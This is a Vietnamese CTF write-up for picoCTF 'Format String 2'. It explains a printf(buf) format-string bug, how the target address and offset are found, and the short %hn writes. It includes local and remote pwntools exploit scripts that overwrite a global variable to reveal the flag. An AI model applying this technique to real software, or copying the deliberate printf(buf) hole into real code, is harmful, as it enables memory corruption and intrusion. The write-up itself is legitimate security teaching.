# Format String 2 Writeup

## 1. Thông tin bài

Chương trình cho source code:

```c
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];

  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);

  scanf("%1024s", buf);

  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```

Mục tiêu là thay đổi giá trị biến global `sus` từ:

```c
0x21737573
```

thành:

```c
0x67616c66
```

Khi đó điều kiện sau sẽ đúng:

```c
if (sus == 0x67616c66)
```

và chương trình sẽ in flag.

---

## 2. Kiểm tra bảo vệ binary

Dùng `checksec`:

```bash
checksec ./vuln
```

Kết quả:

```text
Arch:       amd64-64-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x400000)
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

Một số điểm quan trọng:

* Binary là 64-bit.
* PIE tắt, nên địa chỉ biến global không bị random theo mỗi lần chạy.
* NX bật nhưng không ảnh hưởng nhiều, vì bài này không cần shellcode.
* No canary cũng không quan trọng, vì ta không khai thác buffer overflow mà khai thác format string.

---

## 3. Phân tích lỗ hổng

Lỗ hổng nằm ở dòng:

```c
printf(buf);
```

Ở đây, `buf` là dữ liệu do người dùng nhập vào. Nếu người dùng nhập các format specifier như:

```text
%p %p %p
```

thì `printf()` sẽ hiểu đó là format string và đọc dữ liệu từ stack/register để in ra.

Dòng đúng phải là:

```c
printf("%s", buf);
```

Vì chương trình viết sai thành:

```c
printf(buf);
```

nên ta có thể dùng `%n`, `%hn`, `%hhn` để ghi dữ liệu vào bộ nhớ.

---

## 4. Mục tiêu cần ghi

Biến global:

```c
int sus = 0x21737573;
```

Ta cần đổi thành:

```c
sus = 0x67616c66;
```

Dùng `nm` hoặc `objdump` để tìm địa chỉ biến `sus`:

```bash
nm ./vuln | grep sus
```

Kết quả:

```text
0000000000404060 D sus
```

Vậy địa chỉ của `sus` là:

```text
0x404060
```

---

## 5. Tìm offset format string

Để khai thác format string, cần biết input của mình nằm ở argument thứ mấy của `printf`.

Có thể test bằng payload dạng:

```text
AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

Sau khi kiểm tra, ta tìm được input của mình nằm ở argument thứ `14`.

Vậy offset format string là:

```text
14
```

Trong pwntools, offset này sẽ được dùng như sau:

```python
fmtstr_payload(14, ...)
```

---

## 6. Vì sao không ghi trực tiếp bằng `%n`?

Giá trị cần ghi là:

```text
0x67616c66
```

Đổi sang decimal là một số rất lớn:

```text
1734437990
```

Nếu dùng `%n` để ghi trực tiếp, ta phải in ra hơn 1.7 tỷ ký tự trước, không thực tế.

Vì vậy ta ghi từng phần nhỏ bằng `%hn`.

`%hn` ghi 2 byte.

Giá trị cần ghi:

```text
0x67616c66
```

Do máy dùng little-endian, dữ liệu trong bộ nhớ sẽ là:

```text
66 6c 61 67
```

Ta chia thành 2 phần:

```text
0x404060      <- ghi 0x6c66
0x404062      <- ghi 0x6761
```

Sau khi ghi xong, bộ nhớ tại `sus` sẽ là:

```text
66 6c 61 67
```

Tức là giá trị `sus` trở thành:

```text
0x67616c66
```

---

## 7. Payload bằng pwntools local

Script exploit local:

```python
from pwn import *

context.binary = "./vuln"

p = process("./vuln")

sus = 0x404060

payload = fmtstr_payload(
    14,
    {sus: 0x67616c66},
    write_size="short"
)

print(payload)

p.sendline(payload)
p.interactive()
```

Giải thích:

```python
context.binary = "./vuln"
```

Cho pwntools biết binary đang khai thác.

```python
p = process("./vuln")
```

Chạy chương trình local.

```python
sus = 0x404060
```

Địa chỉ biến global `sus`.

```python
payload = fmtstr_payload(
    14,
    {sus: 0x67616c66},
    write_size="short"
)
```

Tạo payload format string tự động.

Trong đó:

* `14` là offset argument.
* `{sus: 0x67616c66}` nghĩa là ghi giá trị `0x67616c66` vào địa chỉ `sus`.
* `write_size="short"` nghĩa là ghi theo từng 2 byte bằng `%hn`.

---

## 8. Payload remote

Nếu đề bài cho server dạng:

```bash
nc rescued-float.picoctf.net 62123
```

thì script remote là:

```python
from pwn import *

context.binary = "./vuln"

HOST = "rescued-float.picoctf.net"
PORT = 62123

p = remote(HOST, PORT)

sus = 0x404060

payload = fmtstr_payload(
    14,
    {sus: 0x67616c66},
    write_size="short"
)

print(payload)

p.sendlineafter(
    b"What do you have to say?\n",
    payload
)

p.interactive()
```

Chỉ cần thay `HOST` và `PORT` theo thông tin server của bài.

---

## 9. Lưu ý lỗi thường gặp

Ban đầu có thể thử tự viết payload như sau:

```python
payload = p64(sus + 2)
payload += p64(sus)
payload += b"%..."
```

Nhưng cách này dễ sai.

Lý do là địa chỉ `0x404060` khi chuyển thành bytes sẽ chứa byte null:

```python
p64(0x404060)
```

tương ứng với:

```text
\x60\x40\x40\x00\x00\x00\x00\x00
```

Khi `printf(buf)` gặp byte null `\x00`, nó sẽ coi chuỗi đã kết thúc. Vì vậy phần format string phía sau không được xử lý.

Ví dụ output có thể chỉ hiện:

```text
Here's your input: b@@
sus = 0x21737573
```

Điều này cho thấy chương trình chỉ in vài byte đầu của địa chỉ, rồi dừng tại byte null.

Cách đúng là để format string ở phía trước, còn địa chỉ ở phía sau. Dùng `fmtstr_payload()` của pwntools sẽ tự xử lý việc này tốt hơn.

---

## 10. Kết quả

Sau khi gửi payload thành công, biến `sus` được đổi thành:

```text
0x67616c66
```

Điều kiện sau trở thành đúng:

```c
if (sus == 0x67616c66)
```

Chương trình sẽ đọc file `flag.txt` và in flag ra màn hình.

---

## 11. Kết luận

Lỗ hổng chính của bài là format string tại dòng:

```c
printf(buf);
```

Do người dùng kiểm soát trực tiếp format string, ta có thể dùng `%n`/`%hn` để ghi dữ liệu vào địa chỉ mong muốn.

Các bước khai thác:

1. Xác định lỗi `printf(buf)`.
2. Tìm địa chỉ biến `sus`: `0x404060`.
3. Tìm offset input trên stack: `14`.
4. Dùng format string ghi `0x67616c66` vào `sus`.
5. Nhận flag.

Payload cuối cùng:

```python
from pwn import *

context.binary = "./vuln"

HOST = "rescued-float.picoctf.net"
PORT = 62123

p = remote(HOST, PORT)

sus = 0x404060

payload = fmtstr_payload(
    14,
    {sus: 0x67616c66},
    write_size="short"
)

p.sendlineafter(
    b"What do you have to say?\n",
    payload
)

p.interactive()
```
